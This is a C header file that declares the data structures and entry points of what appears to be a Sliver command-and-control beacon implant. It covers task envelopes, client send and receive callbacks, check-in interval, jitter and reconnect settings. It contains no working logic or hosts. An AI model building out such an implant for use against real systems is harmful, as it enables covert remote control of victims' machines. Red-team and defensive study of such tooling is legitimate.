#pragma once

typedef struct _BEACON_TASK {
	LPSTR lpInstanceID;
	PENVELOPE* EnvelopeList;
	DWORD dwNumberOfEnvelopes;
	DWORD dwNextCheckin;
} BEACON_TASK, *PBEACON_TASK;

struct _SLIVER_BEACON_CLIENT {
	GLOBAL_CONFIG GlobalConfig;
	LPVOID lpClient;
	CLIENT_INIT Init;
	CLIENT_START Start;
	CLIENT_SEND Send;
	CLIENT_RECV Receive;
	CLIENT_CLOSE Close;
	CLIENT_CLEANUP Cleanup;
	CHAR szInstanceID[37];
	DWORD dwInterval;
	UINT64 uReconnectInterval;
	DWORD dwJitter;
};

PSLIVER_BEACON_CLIENT BeaconInit
(
	_In_ PGLOBAL_CONFIG pGlobalConfig
);

VOID BeaconMain
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
);

VOID FreeBeaconClient
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
);

